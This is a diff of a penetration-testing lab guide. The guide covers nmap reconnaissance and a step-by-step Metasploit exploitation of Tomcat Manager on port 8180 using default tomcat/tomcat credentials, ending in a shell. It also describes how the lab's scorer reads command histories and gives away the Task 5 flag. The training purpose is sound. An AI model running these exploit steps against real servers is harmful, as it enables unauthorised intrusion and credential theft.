@@ -40,14 +40,12 @@ What's a "port"? A single machine runs many services at once (web, SSH, FTP…).
 
 ## 2. How scoring works (read this, it's the #1 source of confusion)
 
-The scorer **does not watch your screen**. For Tasks 1–4 it reads your **Kali command history** (and, for Task 4, your **Metasploit history**) looking for evidence that you ran the right command. Think of it like a lab notebook: the grader only sees what you _wrote down_ in your history, not what happened live. Task 5 is different — it is scored by the **flag you submit** (see Task 5).
+The scorer **does not watch your screen**. For Tasks 1–4 it reads your **Kali command history** (and, for Task 4, your **Metasploit history**) looking for evidence that you ran the right command. Think of it like a lab notebook: the grader only sees what you _wrote down_ in your history, not what happened live. Task 5 is different - it is scored by the **flag you submit** (see Task 5).
 
 Two habits that make scoring reliable **1.** After a command succeeds, press **Enter** once (this flushes it to history). Scoring is automatic within a few seconds; you usually don't need to do anything.  
-**2.** Stay in the **Kali Linux (CLI)** tab — it's the only terminal this scenario uses. 
+**2.** Every task runs from the **Kali Linux (CLI)** tab - including the Task 5 flag (`whoami`). 
 
-**About Manual Check (Tasks 1–4):** only use it if you finished a task and it was *not* detected automatically. You get **one** Manual Check per task. If that check still can't verify your work, the task moves to **instructor review** (the button is replaced by "Ask an instructor to check") — it does not keep retrying, and no points are given until an instructor approves.
-
-**Points:** the five milestones total the scenario's score. Tasks 1–4 clear when auto-detect or a Manual Check turns to PASS; Task 5 clears when you submit the correct flag.
+**Points:** the five milestones total the scenario's score. Tasks 1–4 are scored automatically once your command lands in your history; Task 5 clears when you submit the correct flag.
 
 ---
 
@@ -68,7 +66,7 @@ Part | What it means
   
 **Done when:** you see replies from at least `$TARGET_META` (Meta) and `$TARGET_DVWA` (DVWA), plus your own Kali.
 
-**Then:** Portal → Tasks → **Manual Check** on _Host Discovery_.
+**Then:** scoring runs automatically - _Host Discovery_ ticks within a few seconds.
 
 What you can do with this You now have a live-host map of your subnet, that's your **scope**. From here you stop scanning the whole `/24` and focus on the box worth attacking: **Meta ($TARGET_META)**. Everything downstream targets that host. 
 
@@ -100,7 +98,7 @@ Please don't run `-p-` first A full `-p-` scan checks all 65,535 ports and is sl
 
 **Done when:** you can see Meta's open ports, **including 8180**.
 
-**Then:** **Manual Check** on _Port Enumeration_.
+**Then:** scoring runs automatically - _Port Enumeration_ ticks within a few seconds.
 
 What you can do with this Each open port is a running service you might attack. Port **8180 (Tomcat)** is the promising door here. Next you'll fingerprint its exact version to find a matching exploit, and you can ignore the closed ports entirely. 
 
@@ -123,7 +121,7 @@ Scoring detail The checker specifically looks for an `nmap` command containing `
 
 **Done when:** the output shows versions, e.g. OpenSSH on 22, Apache on 80, and **Tomcat on 8180**.
 
-**Then:** **Manual Check** on _Service Version Detection_.
+**Then:** scoring runs automatically - _Service Version Detection_ ticks within a few seconds.
 
 What you can do with this Version strings are gold. Search them in **Exploit-DB** or Metasploit (`search tomcat_mgr`) to find a known exploit for that exact software, this is how recon turns into the working attack you run in Task 4. 
 
@@ -147,6 +145,8 @@ echo $TARGET_META
 Remember that IP (same as **Meta** in the lab header; in lab slot 1 it's usually `10.0.51.20`). You will paste **those digits** into `set RHOSTS` below. When this Guide is loaded in the portal, the Copy button on the next block should already show your real Meta IP in place of `$TARGET_META`, use that.
 
 #### Step 2, launch Metasploit
+
+_**`msfconsole -q`** - starts the Metasploit console (`-q` skips the banner). This is the tool that runs the exploit; you'll get an `msf >` prompt._
 ```bash
 msfconsole -q
 ```
@@ -159,30 +159,38 @@ msfconsole -q
 > 3. `set TARGET 1` (must be set **before** `run`)
 
 **Run these inside `msfconsole`, one command at a time, in this order.** Each
-block has its own Copy button — copy, paste, press Enter, then move to the next.
+block has its own Copy button - copy, paste, press Enter, then move to the next.
 Do **not** paste them all at once.
 
+_**`use …`** - load the Tomcat Manager deploy exploit module into Metasploit._
 ```bash
 use exploit/multi/http/tomcat_mgr_deploy
 ```
+_**`set RHOSTS`** - tell the exploit which host to hit: Meta's numeric IP (the Copy button fills in your real IP)._
 ```bash
 set RHOSTS $TARGET_META
 ```
+_**`set RPORT 8180`** - the port Tomcat Manager listens on in this lab._
 ```bash
 set RPORT 8180
 ```
+_**`set HttpUsername tomcat`** - the Manager login username (the default this box never changed)._
 ```bash
 set HttpUsername tomcat
 ```
+_**`set HttpPassword tomcat`** - the matching default password; together they let the exploit log in._
 ```bash
 set HttpPassword tomcat
 ```
+_**`set PATH /manager/text`** - the Manager API path on this Debian Tomcat; required or the upload fails._
 ```bash
 set PATH /manager/text
 ```
+_**`set TARGET 1`** - pick the Java Universal payload target; without it the exploit usually finishes with **no session**._
 ```bash
 set TARGET 1
 ```
+_**`run`** - fire the exploit: it uploads a payload and opens your shell on Meta._
 ```bash
 run
 ```
@@ -198,9 +206,19 @@ Command | What it does
 `run` | fire the exploit  
 
 #### Step 4, confirm you're in (inside the new session)
+
+The session that opens is a **Meterpreter** prompt (`meterpreter >`), which is
+Metasploit's own interpreter - plain Linux commands like `id`/`whoami` return
+*"Unknown command"* there. First drop to a real command shell:
+
+_**`shell`** - leaves Meterpreter and gives you a normal Linux shell on Meta, where ordinary commands work._
+```bash
+shell
+```
+
+_**`id`** - shows the user/group you are running as, to prove the foothold._
 ```bash
 id
-whoami
 ```
 
 Success looks like:
@@ -209,58 +227,59 @@ Success looks like:
 uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
 ```
 
-(The numeric uid may differ; the name in parentheses must be `tomcat`.)
+(The numeric uid may differ; the name in parentheses must be `tomcat`.) Tip: if
+you'd rather stay in Meterpreter, `getuid` shows the same account without a shell.
 
-#### Step 5, exit the session (required for scoring)
+#### Step 5, exit back to the msf prompt (required for scoring)
+
+You went **two levels deep** - the exploit opened Meterpreter, and you ran
+`shell` inside it - so you need to **type `exit` twice** to climb back out:
+
+_First `exit` - leaves the Linux shell and returns you to the `meterpreter >` prompt._
+```bash
+exit
+```
+_Second `exit` - closes the Meterpreter session and returns you to the `msf exploit(...) >` prompt (you'll see "Shutting down session")._
 ```bash
 exit
 ```
 
-> **Why exit matters:** Manual Check reads your **Metasploit history**. That history is not fully written until the session/console activity is flushed, so this milestone can stay FAIL until you actually run `exit`. If it still fails after a working shell, run one more msf command or close `msfconsole` cleanly, then re-check.
+> **Why exit matters:** scoring reads your **Metasploit history**, which isn't fully written until the session/console activity is flushed. This milestone can stay unscored until you actually run `exit`. If it still hasn't scored after a working shell, run one more msf command or close `msfconsole` cleanly.
 
 **Done when:** you got a `tomcat` shell (e.g. `uid=1001(tomcat) …`), your msf history includes numeric `set RHOSTS …`, `set PATH /manager/text`, and `set TARGET 1`, and you ran `exit`.
 
-**Then:** **Manual Check** on _Tomcat Manager Exploitation_.
+**Then:** scoring runs automatically - _Tomcat Manager Exploitation_ ticks within a few seconds.
 
 > **What you can do with this:** You have a shell as the `tomcat` service account. From this foothold you'd enumerate the host, hunt for a **privilege-escalation** path to root, harvest credentials and config files, and pivot to other machines on the lab network. This shell is the launch point for the rest of an engagement. 
 
 
 ### Task 5: capture the flag (whoami)
 
-**Goal:** prove you have the shell by reading the flag that only the `tomcat`
-user can see, then submit it in the portal.
+**Goal:** run `whoami` in your Kali terminal and submit the username it prints.
 
-> **What you're doing & why:** A real engagement records *proof* of access, not
-> just "it worked." Here the proof is a **flag** — a unique string placed in the
-> `tomcat` user's home directory. Reading it confirms your foothold; submitting
-> it is how this task is scored.
+> **What you're doing & why:** `whoami` is the first thing you run on any box to
+> know *which account you are*. Here your answer **is the flag** - a single short
+> word you type in, so there's nothing to copy out of the terminal.
 
-**Which tool:** the Metasploit session (or a plain shell) from Task 4, on **Meta**.
+**Which tool:** the **Kali Linux (CLI)** tab - the same terminal you used for
+Tasks 1–4. Nothing else is needed.
 
-#### Step 1 — confirm who you are
+#### Step 1 - ask the terminal who you are
+
+_**`whoami`** - prints the account name you're logged in as on Kali. That single word is your flag (short and easy to type - no copying needed)._
 ```bash
 whoami
 ```
-You should see `tomcat`. If you see something else, you are not in the shell from
-Task 4 — redo Task 4 first.
 
-#### Step 2 — read the flag
-```bash
-cat /home/tomcat/whoami_flag.txt
-```
-The line ends with a value in the form `FLAG{...}`.
+#### Step 2 - submit the word it prints
+It prints one word - your Kali username (for example `student`). On the right,
+open the **Tasks** panel, find **Capture the Flag (whoami)**, type that word into
+**Submit the flag you found**, and click **Submit**.
 
-#### Step 3 — submit the flag
+- **Correct → the task completes and the points are awarded.**
+- **Wrong → no points, with a message to check it and try again.**
 
-Open the **Tasks** panel on the right, find **Capture the Flag (whoami)**, paste
-the `FLAG{...}` value into **Submit the flag you found**, and click **Submit**.
-
-- **Correct flag → the task is marked complete and the points are awarded.**
-- **Wrong flag → no points, with a message to check it and try again.** Your flag
-  is unique to you, so copy it exactly (including `FLAG{` and `}`).
-
-**How it's scored:** by the flag you submit — there is no Manual Check for this
-task.
+**How it's scored:** by the word you submit (your live `whoami`).
 
 ---
 ## 3. Recon playground (explore, not scored)
@@ -283,7 +302,7 @@ These are noisy OS, version, and `--script vuln` scans light up a defender's sen
 
 Symptom | Fix  
 --- | ---  
-Manual Check FAIL after nmap | Press **Enter** , wait ~1s, check again. Make sure you're in the Kali tab.  
+Task not scored after nmap | Press **Enter** , wait ~2s. Make sure you're in the Kali tab.  
 No route / host down | Confirm the lab is **ACTIVE** ; use the exact IPs from your lab header.  
 `Exploit completed, but no session was created` | Almost always missing **`set TARGET 1`** before `run`, or `set RHOSTS` was the literal text `$TARGET_META` instead of digits. Fix both, `run` again.  
 Tomcat exploit fails / no shell | History must show **`set PATH /manager/text`**, **`set TARGET 1`**, `RPORT 8180`, creds `tomcat`/`tomcat`, and a numeric Meta IP on `RHOSTS`.  
